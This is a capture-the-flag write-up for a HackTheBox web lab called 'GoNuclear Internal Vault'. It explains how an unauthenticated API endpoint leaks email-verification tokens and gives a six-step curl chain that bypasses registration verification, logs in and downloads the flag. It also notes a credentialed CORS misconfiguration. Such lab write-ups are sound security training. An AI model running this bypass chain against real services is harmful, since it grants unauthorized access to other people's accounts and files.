# GoNuclear Internal Vault — HTB (easy, web)

**Flag read from a live response.** Target was a throwaway HTB instance
(`154.57.164.69:34884`, then `154.57.164.71:41110` after the first expired).

## What the app is

nginx 1.22.1 in front of two things: a Flask app serving the pages, and a
**FastAPI** backend mounted at `/api`. The front-end gave that away — the entry
page links only `/static/script.js`, but `/verify-email` links three more
scripts, and `api.js:3` reads `baseURL: '/api', // Direct FastAPI URL`.

## The whole bug, in one line of a published document

`GET /api/openapi.json` answers 200 with FastAPI's auto-generated spec. In it:

```
POST /userDetails    "Get User Details"    body: {email}
```

and that operation has **no `security:` key**, while every `/files*` operation
has `security: [{"OAuth2PasswordBearer": []}]`. Its response schema,
`UserDetailsResponse`, lists `verifyToken`.

So an unauthenticated caller can ask for any account's details by email and read
back its email-verification token. Registration is gated on email verification;
the token that lifts that gate is readable without credentials.

## The chain, six requests

```bash
B=http://<host>:<port>/api
EM="probe$(date +%s)@gonuclear.com"; PW='Pr0be!Test123'

# 1. register — lands unverified
curl -s -X POST "$B/register" -H 'Content-Type: application/json' \
     -d "{\"email\":\"$EM\",\"password\":\"$PW\"}"
#    {"message":"User registered successfully"}

# 2. read your own verifyToken with NO Authorization header
curl -s -X POST "$B/userDetails" -H 'Content-Type: application/json' \
     -d "{\"email\":\"$EM\"}"
#    {"id":2,...,"is_verified":false,"verifyToken":"03c8dfa6-97f2-4750-bc7e-68504f2d1fd3",...}

# 3. verify yourself with it
curl -s -X POST "$B/email-verify" -H 'Content-Type: application/json' \
     -d "{\"email\":\"$EM\",\"token\":\"03c8...\"}"
#    {"message":"Email verified successfully"}

# 4. now login works. Before step 3 it answered {"detail":"Inactive user"}
curl -s -X POST "$B/login" -H 'Content-Type: application/json' \
     -d "{\"email\":\"$EM\",\"password\":\"$PW\"}"
#    {"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"bearer"}

# 5. list files — every one is owner_id 1, not mine
curl -s "$B/files" -H "Authorization: Bearer $AT"
#    ... {"original_filename":"flag.txt","file_size":33,"id":5,"owner_id":1} ...

# 6. download it
curl -s "$B/files/5/download" -H "Authorization: Bearer $AT"
#    HTB{REDACTED}
```

The flag name states the mechanism: registration bypass.

## Traps that cost time here

- **The entry page is not the endpoint inventory.** `/static/script.js` contains
  no `fetch` call at all — it is client-side utilities only, and a regex for
  `fetch|axios|XMLHttpRequest` over it returns nothing. The API client lives in
  `/static/api.js`, which only `/verify-email` links. Recon that follows links
  from `/` alone cannot find it.
- **`/files` is listed with `security` and genuinely enforces it**; the IDOR is
  not there. Every file is `owner_id: 1` and a verified account reads them all,
  so `is_public: true` on the seeded files is what opens step 5 — not a missing
  ownership check on `{file_id}`. Do not report an IDOR that is not there.
- **Login says `{"detail":"Inactive user"}`, not "wrong password"**, before
  verification. That message is the signal that verification is the only gate.
- **Read the `security` key, not just the path list.** The spec was downloaded
  and its 8 paths extracted within three minutes of first contact; the bug sat
  in a field nobody read for another forty minutes.

## Cost, honestly

A ten-agent `web-sweep` fan-out found `/api/openapi.json` and a real CORS
misconfiguration, in 42 minutes and 1.1M tokens across 12 agents. One of those
twelve produced the decisive artifact. The solve from the spec took six requests
and about ninety seconds. The lesson became the `Spec` phase in
`.claude/workflows/web-sweep.js`: a published specification ends the sweep.

## Also measured, not used

`/api/*` reflects **any** `Origin` together with `access-control-allow-credentials:
true` whenever a cookie is present (`vary: Origin`). Without a cookie it answers
`access-control-allow-origin: *`, which browsers reject — so the credentialed
reflection is the exploitable half. Recorded as a confirmed `web-cors` probe; not
needed for the flag.
